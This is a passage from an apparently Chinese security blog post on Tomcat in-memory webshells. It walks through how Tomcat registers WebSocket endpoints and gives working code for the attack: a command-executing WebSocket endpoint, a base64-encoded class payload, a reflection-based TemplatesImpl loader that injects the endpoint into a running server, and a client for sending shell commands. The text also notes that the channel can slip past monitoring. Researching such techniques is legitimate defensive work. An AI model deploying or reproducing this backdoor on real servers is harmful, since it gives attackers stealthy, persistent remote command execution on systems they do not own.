        } catch (ClassNotFoundException ex) {
            throw new RuntimeException(ex);
        } catch (IllegalAccessException ex) {
            throw new RuntimeException(ex);
        }
    }


    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

所以我放弃这个马，我认为这个马有很多的局限性，当然作者思路还是很NB的，绝大部分问题在于我的技术不足

## WebSocket内存马

Tomcat从7.0.2版本开始支持WebSocket。**Tomcat 从 7.0.47 版本开始支持 JSR 356**，废弃了之前的自定义 WebSocket API。引入了全新的API，包括：

* 注解驱动的 WebSocket（@ServerEndpoint）
* 标准的 Session、MessageHandler、Endpoint 等类接口
* 与 Servlet 容器集成

tomcat-catalina 是 Tomcat 的核心模块之一，但 **它并不包含 WebSocket 支持本身**。要启用 WebSocket 功能，**还需要额外添加 WebSocket 相关模块**。

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-websocket</artifactId>
    <version>8.5.56</version>
</dependency>
```

在 **Spring Boot 2.0 及以上版本**，就已经 **内置支持 WebSocket（JSR-356 标准）**

WebSocket 是 **全双工** 的，客户端和服务器可以同时发送消息。

**通信双方** 都是 Endpoint，只是角色不同：

* **客户端**：ClientEndpoint
* **服务端**：ServerEndpoint

要注入WebSocket内存马，先看看建立一个WebSocket通道具体怎么实现的，可分为注解实现和手动实现两种

### 注解实现

#### 服务端

利用@ServerEndpoint注解创建WebSocket。服务端在接收到握手请求后，为每个连接自动创建一个新的 ServerEndpoint 实例。

如下：

```
import javax.websocket.OnClose;
import javax.websocket.OnError;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

@ServerEndpoint("/hello-websocket")
public class HelloWebSocket {
    @OnOpen
    public void onOpen(Session session) {
        System.out.println("连接建立：" + session.getId());
    }

    @OnMessage
    public void onMessage(String msg, Session session) {
        System.out.println("收到消息：" + msg);
        session.getAsyncRemote().sendText("你发送了：" + msg);
    }

    @OnClose
    public void onClose(Session session) {
        System.out.println("连接关闭：" + session.getId());
    }

    @OnError
    public void onError(Session session, Throwable throwable) {
        throwable.printStackTrace();
    }
}
```

#### 客户端

```
@ClientEndpoint
public class ChatClient {

    @OnOpen
    public void onOpen(Session session) {
        System.out.println("客户端连接成功");
        session.getAsyncRemote().sendText("你好服务端！");
    }

    @OnMessage
    public void onMessage(String message) {
        System.out.println("收到服务器消息: " + message);
    }

    @OnClose
    public void onClose(Session session) {
        System.out.println("客户端连接关闭");
    }

    @OnError
    public void onError(Throwable throwable) {
        throwable.printStackTrace();
    }
}
```

用WebSocketContainer.connectToServer进行连接

```
WebSocketContainer container = ContainerProvider.getWebSocketContainer();
Session session = container.connectToServer(ChatClient.class, URI.create("ws://localhost:8080/hello-websocket"));
```

其中@OnOpen，@OnMessage，@OnClose，@OnError的功能相信大家都能理解

### 手动实现

可以手动实现@ServerEndpoint的功能，那么该注解的功能是什么呢？

GPT问一下非springboot项目如何调试@ServerEndpoint注册过程，知道在WsSci.onStartup()中开始注册被@ServerEndpoint注解装饰的类

![](images/20250416144306-0d7d6218-1a8e-1.png)

关于整个SCI的过程，其实得从SPI说起。详情：<https://godownio.github.io/2024/10/28/snakeyaml/#SPI-%E6%9C%BA%E5%88%B6>

简单来说，SPI就是在运行时从 META-INF/services/ 目录下指定的配置文件中加载实现类。

Tomcat启动时，会使用SPI扫描所有JAR

ServletContainerInitializer就满足SPI的条件，作为配置文件，指定初始化时加载WsSci

![](images/20250416144306-0dd977e5-1a8e-1.png)

![](images/20250416144307-0e44b502-1a8e-1.png)

看到WsSci，@HandlesTypes({ServerEndpoint.class, ServerApplicationConfig.class, Endpoint.class}) 用于标注一个 ServletContainerInitializer（SCI） 实现类，告诉 Servlet 容器：

“启动时请帮我收集所有继承了 ServerEndpoint、ServerApplicationConfig、Endpoint 的类，我需要用它们来完成 WebSocket 的初始化配置。”

![](images/20250416144308-0ec3b0cc-1a8e-1.png)

@HandlesTypes 是 **Servlet 3.0** 中引入的注解，标记在实现了 ServletContainerInitializer 的类上，容器会根据你指定的类型自动收集相关类，并作为参数传入 onStartup() 方法。

一句话说来，SCI就是 Servlet 3.0 引入的一种机制，容器在部署时会扫描 META-INF/services/ServletContainerInitializer，加载并执行其中定义类的 onStartup() 方法，实现动态组件注册。

从代码上来说，Tomcat启动时，LifecycleBase.start会调用startInternal()

![](images/20250416144309-0f2ce0dc-1a8e-1.png)

startInternal方法会循环调用initializers（也就是META-INF/services/ServletContainerInitializer）内类的onStartup方法

![](images/20250416144309-0f8c9ef8-1a8e-1.png)

在WsSci#OnStartup方法上打上断点

首先调用了init方法

![](images/20250416144310-0fed01b6-1a8e-1.png)

初始化WsServerContainer并返回

![](images/20250416144311-107522b4-1a8e-1.png)

回到OnStartup，对SCI收集到所有继承了 ServerEndpoint、ServerApplicationConfig、Endpoint 的类作为参数clazzes，对这个参数进行一个遍历

![](images/20250416144312-10ed5fe4-1a8e-1.png)

里面就有自定义的HelloWebSocket

![](images/20250416144313-11868498-1a8e-1.png)

循环的主要功能是遍历传入的类集合 clazzes，并对每个类进行分类和过滤。下图后面三个循环分别是：

* 如果类实现了 ServerApplicationConfig 接口，则实例化该类并添加到 serverApplicationConfigs 集合中。
* 如果类继承了 Endpoint 类，则将其添加到 scannedEndpointClazzes 集合中。
* 如果类标注了 @ServerEndpoint 注解，则将其添加到 scannedPojoEndpoints 集合中。

![](images/20250416144313-11f930a1-1a8e-1.png)

循环结束后，if块调用了把scannedPojoEndpoints添加到filteredPojoEndpoints，else块是针对上面类继承Endpoint的处理。

![](images/20250416144314-128fa121-1a8e-1.png)

什么情况会走到else块呢？

如下利用实现ServerApplicationConfig，自定义决定注册哪些Endpoint

```
public class MyServerAppConfig implements ServerApplicationConfig {
    @Override
    public Set<ServerEndpointConfig> getEndpointConfigs(Set<Class<? extends Endpoint>> scanned) {
        // 可以根据条件动态决定注册哪些Endpoint
        return Collections.emptySet(); // 不注册任何程序化 Endpoint
    }

    @Override
    public Set<Class<?>> getAnnotatedEndpointClasses(Set<Class<?>> scanned) {
        Set<Class<?>> result = new HashSet<>();
        for (Class<?> clazz : scanned) {
            if (clazz.getName().contains("MyWebSocket")) {
                result.add(clazz); // 只注册类名包含 MyWebSocket 的 Endpoint
            }
        }
        return result;
    }
}
```

getEndpointConfigs(...)：用于注册**程序化配置的 Endpoint**（继承自 jakarta.websocket.Endpoint）。

getAnnotatedEndpointClasses(...)：用于筛选哪些带有 @ServerEndpoint 注解的类要被注册。

WsSci也指定了收集该类的子类

![](images/20250416144315-130c7468-1a8e-1.png)

这样就会在else块内就会调用getEndpointConfigs和getAnnotatedEndpointClasses去做对应的注册。相当于一个WebSocket筛选器

![](images/20250416144316-137bb589-1a8e-1.png)

之后循环对filteredPojoEndpoint调用WsServerContainer.addEndpoint，跟进该方法

![](images/20250416144316-13e37cc1-1a8e-1.png)

![](images/20250416144317-143cb8fc-1a8e-1.png)

WsServerContainer.addEndpoint方法内首先是检查传入的类是否有ServerEndpoint注解，所以我们手动注册WebSocket内存马肯定是不能直接调用WsServerContainer.addEndpoint的

![](images/20250416144318-14962140-1a8e-1.png)

接着调用了ServerEndpointConfig.Builder.create().build()，可以看到参数是HelloWebSocket和value写的映射路径/hello-websocket

![](images/20250416144318-1501d363-1a8e-1.png)

至于后面跟的decoders,encoders,subprotocols,configurator，是因为ServerEndpoint还有一些扩展使用，如下。但是这一块我们无需关注

@ServerEndpoint(value = "/ws/{userId}", encoders = {MessageEncoder.class}, decoders = {MessageDecoder.class}, configurator = MyServerConfigurator.class)

在调用完create().build()后，调用了另一个参数类型的WsServerContainer.addEndpoint(ServerEndpointConfig sec, boolean fromAnnotatedPojo)

![](images/20250416144319-1582e6d9-1a8e-1.png)

WsServerContainer共有四个addEndpoint，注意参数的区别

![](images/20250416144320-15e93686-1a8e-1.png)

该addEndpoint内没有了对注解的判断，所以是能直接用的

![](images/20250416144321-166475ea-1a8e-1.png)

由上面的分析可知，理论上，假如是通过继承Endpoint实现的ServerEndpoint，则必须通过经过serverApplicationConfigs的筛选才能注册进filteredEndpointConfigs

![](images/20250416144322-16f00732-1a8e-1.png)

但是直接调用最后的addEndpoint，则完全不用管serverApplicationConfigs

### 内存马实现

因为是手动调用WsServerContainer.addEndpoint(ServerEndpointConfig sec, boolean fromAnnotatedPojo)，如何获取WsServerContainer呢？

还记得WsSci.init吗，初始化WsServerContainer后调用StandardContext.setAttribute装到到键名为javax.websocket.server.ServerContainer中

![](images/20250416144323-178a46a4-1a8e-1.png)

用getAttribute能从StandardContext取出，java中获取StandardContext的方法见：<https://godownio.github.io/2025/02/26/tomcat-xia-huo-qu-standardcontext-de-fang-fa-jsp-zhuan-java-nei-cun-ma/>

当然也可以通过StandardContext->ApplicationContext->attributes反射取出

![](images/20250416144323-1810d238-1a8e-1.png)

java-object-searcher从线程中也是从StandardContext中找到的WsServerContainer：

![](images/20250416144324-1876fc77-1a8e-1.png)

好像只有这一种方式取到WsServerContainer了

WebSocket内存马的实现过程如下，依旧通过defineClass加载字节码：

1. 获取StandardContext，进而获取WsServerContainer
2. 用ServerEndpointConfig.Builder.create().build()创建恶意ServerWebSocket，用addEndpint添加进WsServerContainer
3. 需要一个相适配的ClientWebSocket去连接

注意继承Endpoint实现的恶意ServerWebSocket，重写onMessage需要实现MessageHandler.Whole<String>，至于为什么是重写onMessage各位肯定知道

先制作一个恶意的EvilServerWebSocket：

```
package org.example.tomcatmemshell.WebSocket;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class EvilServerWebSocket extends Endpoint implements MessageHandler.Whole<String> {
    public static void main(String[] args) throws IOException {
        byte[] string = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/WebSocket/EvilServerWebSocket.class")));
        System.out.println(new String(string));
    }
    private Session session;
    @Override
    public void onOpen(Session session, EndpointConfig config) {
        this.session = session;
        this.session.addMessageHandler(this);
    }
    @Override
    public void onMessage(String message) {
        try {
            Process process;
            String[] cmds = !System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"sh", "-c", message} : new String[]{"cmd.exe", "/c", message};
            process = Runtime.getRuntime().exec(cmds);
            InputStream inputStream = process.getInputStream();
            StringBuilder stringBuilder = new StringBuilder();
            int i;
            while ((i = inputStream.read()) != -1)
                stringBuilder.append((char)i);
            inputStream.close();
            process.waitFor();
            session.getBasicRemote().sendText(stringBuilder.toString());
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
```

然后用TemplatesImpl去注册上面的EvilServerWebSocket，注意这里测试，在上面的代码生成完base64码后注释掉，不然会报 loader (instance of org/apache/catalina/loader/ParallelWebappClassLoader): attempted duplicate class definition重复加载类

```
package org.example.tomcatmemshell.WebSocket;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.websocket.server.WsServerContainer;

import javax.websocket.DeploymentException;
import javax.websocket.server.ServerEndpointConfig;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.concurrent.*;

public class WebSocketMemShell extends AbstractTranslet {
    public WebSocketMemShell() {
        try{
            byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQAygoAKQBfCgBgAGEIAGIHAGMKAGQAZQoAZgBnCgBoAGkJAGoAawoABABsCgBtAG4JACgAbwsAcABxCAByCgBqAHMKAAQAdAgAdQoABAB2CAB3CAB4CAB5CAB6CgB7AHwKAHsAfQoAfgB/BwCACgAZAF8KAIEAggoAGQCDCgCBAIQKAH4AhQsAcACGCgAZAIcLAIgAiQcAigoAIgCLBwCMBwCNCgAlAI4KACgAjwcAkAcAkQcAkwEAB3Nlc3Npb24BABlMamF2YXgvd2Vic29ja2V0L1Nlc3Npb247AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBADpMb3JnL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvV2ViU29ja2V0L0V2aWxTZXJ2ZXJXZWJTb2NrZXQ7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnN0cmluZwEAAltCAQAKRXhjZXB0aW9ucwEABm9uT3BlbgEAPChMamF2YXgvd2Vic29ja2V0L1Nlc3Npb247TGphdmF4L3dlYnNvY2tldC9FbmRwb2ludENvbmZpZzspVgEABmNvbmZpZwEAIExqYXZheC93ZWJzb2NrZXQvRW5kcG9pbnRDb25maWc7AQAJb25NZXNzYWdlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAARjbWRzAQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAA1zdHJpbmdCdWlsZGVyAQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAAWkBAAFJAQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEAIExqYXZhL2xhbmcvSW50ZXJydXB0ZWRFeGNlcHRpb247AQAHbWVzc2FnZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHADcHAJAHAGMHAJQHAJUHAIAHAIoHAIwBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAlTaWduYXR1cmUBAAVXaG9sZQEADElubmVyQ2xhc3NlcwEAVExqYXZheC93ZWJzb2NrZXQvRW5kcG9pbnQ7TGphdmF4L3dlYnNvY2tldC9NZXNzYWdlSGFuZGxlciRXaG9sZTxMamF2YS9sYW5nL1N0cmluZzs+OwEAClNvdXJjZUZpbGUBABhFdmlsU2VydmVyV2ViU29ja2V0LmphdmEMAC0ALgcAlgwAlwCZAQBNdGFyZ2V0L2NsYXNzZXMvb3JnL2V4YW1wbGUvdG9tY2F0bWVtc2hlbGwvV2ViU29ja2V0L0V2aWxTZXJ2ZXJXZWJTb2NrZXQuY2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nBwCaDACbAJwHAJ0MAJ4AnwcAoAwAoQCiBwCjDACkAKUMAC0ApgcApwwAqABADAArACwHAKkMAKoAqwEAB29zLm5hbWUMAKwArQwArgCvAQADd2luDACwALEBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwCyDACzALQMALUAtgcAlAwAtwC4AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAJUMALkAugwAuwC8DAC9AC4MAL4AugwAvwDBDADCAK8HAMQMAMUAQAEAE2phdmEvaW8vSU9FeGNlcHRpb24MAMYALgEAHmphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAtAMcMAD8AQAEAOG9yZy9leGFtcGxlL3RvbWNhdG1lbXNoZWxsL1dlYlNvY2tldC9FdmlsU2VydmVyV2ViU29ja2V0AQAYamF2YXgvd2Vic29ja2V0L0VuZHBvaW50BwDIAQAkamF2YXgvd2Vic29ja2V0L01lc3NhZ2VIYW5kbGVyJFdob2xlAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBAAdFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwEAE2phdmEvbmlvL2ZpbGUvUGF0aHMBAANnZXQBADsoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9uaW8vZmlsZS9QYXRoOwEAE2phdmEvbmlvL2ZpbGUvRmlsZXMBAAxyZWFkQWxsQnl0ZXMBABgoTGphdmEvbmlvL2ZpbGUvUGF0aDspW0IBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAAZlbmNvZGUBAAYoW0IpW0IBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQAFKFtCKVYBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAF2phdmF4L3dlYnNvY2tldC9TZXNzaW9uAQARYWRkTWVzc2FnZUhhbmRsZXIBACMoTGphdmF4L3dlYnNvY2tldC9NZXNzYWdlSGFuZGxlcjspVgEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAARyZWFkAQADKClJAQAGYXBwZW5kAQAcKEMpTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEABWNsb3NlAQAHd2FpdEZvcgEADmdldEJhc2ljUmVtb3RlAQAFQmFzaWMBACgoKUxqYXZheC93ZWJzb2NrZXQvUmVtb3RlRW5kcG9pbnQkQmFzaWM7AQAIdG9TdHJpbmcHAMkBACRqYXZheC93ZWJzb2NrZXQvUmVtb3RlRW5kcG9pbnQkQmFzaWMBAAhzZW5kVGV4dAEAD3ByaW50U3RhY2tUcmFjZQEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgEAHmphdmF4L3dlYnNvY2tldC9NZXNzYWdlSGFuZGxlcgEAHmphdmF4L3dlYnNvY2tldC9SZW1vdGVFbmRwb2ludAAhACgAKQABACoAAQACACsALAAAAAUAAQAtAC4AAQAvAAAALwABAAEAAAAFKrcAAbEAAAACADAAAAAGAAEAAAANADEAAAAMAAEAAAAFADIAMwAAAAkANAA1AAIALwAAAF4ABAACAAAAIrgAAhIDA70ABLgABbgABrYAB0yyAAi7AARZK7cACbYACrEAAAACADAAAAAOAAMAAAAPABMAEAAhABEAMQAAABYAAgAAACIANgA3AAAAEwAPADgAOQABADoAAAAEAAEAIgABADsAPAABAC8AAABWAAIAAwAAABAqK7UACyq0AAsquQAMAgCxAAAAAgAwAAAADgADAAAAFQAFABYADwAXADEAAAAgAAMAAAAQADIAMwAAAAAAEAArACwAAQAAABAAPQA+AAIAAQA/AEAAAQAvAAABnwAEAAcAAACaEg24AA62AA8SELYAEZoAGAa9AARZAxISU1kEEhNTWQUrU6cAFQa9AARZAxIUU1kEEhVTWQUrU064ABYttgAXTSy2ABg6BLsAGVm3ABo6BRkEtgAbWTYGAp8ADxkFFQaStgAcV6f/6xkEtgAdLLYAHlcqtAALuQAfAQAZBbYAILkAIQIApwAVTSy2ACOnAA1NuwAlWSy3ACa/sQACAAAAhACHACIAAACEAI8AJAADADAAAABCABAAAAAcADgAHQBAAB4ARgAfAE8AIQBbACIAZwAjAGwAJABxACUAhAAqAIcAJgCIACcAjAAqAI8AKACQACkAmQArADEAAABcAAkAQABEAEEAQgACADgATABDADcAAwBGAD4ARABFAAQATwA1AEYARwAFAFcALQBIAEkABgCIAAQASgBLAAIAkAAJAEoATAACAAAAmgAyADMAAAAAAJoATQBOAAEATwAAADkAByVRBwBQ/wAXAAYHAFEHAFIHAFMHAFAHAFQHAFUAAPwAFwH/AB8AAgcAUQcAUgABBwBWRwcAVwkQQQA/AFgAAQAvAAAAMwACAAIAAAAJKivAAAS2ACexAAAAAgAwAAAABgABAAAADQAxAAAADAABAAAACQAyADMAAAADAFkAAAACAFwAXQAAAAIAXgBbAAAAGgADACoAkgBaBgkAaABgAJgACQCIAMMAwAYJ");
//                        ClassLoader classLoader = ClassLoader.getSystemClassLoader();//不能使用，找不到Tomcat下的类,如java.lang.NoClassDefFoundError: org/apache/tomcat/util/threads/ThreadPoolExecutor
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Method defineClass = ClassLoader.class.getDeclaredMethod(
                    "defineClass", String.class, byte[].class, int.class, int.class
            );
            defineClass.setAccessible(true);
            Class<?> EvilServerWebSocketClass = (Class<?>) defineClass.invoke(classLoader,
                    "org.example.tomcatmemshell.WebSocket.EvilServerWebSocket" , classBytes, 0, classBytes.length
            );
            Object instance = EvilServerWebSocketClass.getDeclaredConstructor().newInstance();
            ServerEndpointConfig serverEndpointConfig = ServerEndpointConfig.Builder.create(EvilServerWebSocketClass,"/evilWebSocket").build();
            StandardContext standardContext = getStandardContext1();
            WsServerContainer wsServerContainer = (WsServerContainer) standardContext.getServletContext().getAttribute("javax.websocket.server.ServerContainer");
            wsServerContainer.addEndpoint(serverEndpointConfig);

        } catch (IllegalAccessException ex) {
            throw new RuntimeException(ex);
        } catch (InvocationTargetException e) {
            throw new RuntimeException(e);
        } catch (NoSuchMethodException e) {
            throw new RuntimeException(e);
        } catch (InstantiationException e) {
            throw new RuntimeException(e);
        } catch (DeploymentException e) {
            throw new RuntimeException(e);
        }
    }
    public static StandardContext getStandardContext1() {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();
            return (StandardContext) StandardContext;
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (ClassNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
    }
    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

然后用自己做的客户端WebSocketClient去连接

```
package org.example.tomcatmemshell.WebSocket;

import javax.websocket.*;
import java.net.URI;
import java.util.Scanner;

@ClientEndpoint
public class WebSocketClient {

    @OnOpen
    public void onOpen(Session session) {
        System.out.println("✅ Connected to server");
    }

    @OnMessage
    public void onMessage(String message) {
        System.out.println("📥 Received: " + message);
    }

    @OnClose
    public void onClose(Session session, CloseReason reason) {
        System.out.println("❌ Connection closed: " + reason);
    }

    @OnError
    public void onError(Session session, Throwable throwable) {
        System.out.println("⚠️ Error: " + throwable.getMessage());
    }

    public static void main(String[] args) {
        String uri = "ws://127.0.0.1:8080/TomcatMemshell_war_exploded/evilWebSocket";

        try {
            WebSocketContainer container = ContainerProvider.getWebSocketContainer();
            Session session = container.connectToServer(WebSocketClient.class, new URI(uri));

            // 控制台输入发送消息
            Scanner scanner = new Scanner(System.in);
            while (true) {
                System.out.print("📤 Send: ");
                String msg = scanner.nextLine();
                if ("exit".equalsIgnoreCase(msg)) break;
                session.getAsyncRemote().sendText(msg);
            }

            session.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

演示一波功能：

![](images/20250416144344-2475ed05-1a8e-1.gif)

![](images/20250416144346-257eba73-1a8e-1.png)

大佬已经做了一整套webSocket内存马利用开源工具了：

<https://github.com/veo/wsMemShell/tree/main>

这种内存马很明显有个好处，就是新开ws TCP通道，很多防护设备可能检测不到该通道的流量，不过坏处也在于此，新开通道很容易被监测。

REF：

<https://mp.weixin.qq.com/s/RuP8cfjUXnLVJezBBBqsYw>

<https://xz.aliyun.com/news/11012>

<https://wileysec.github.io/fee784a451d7.html>
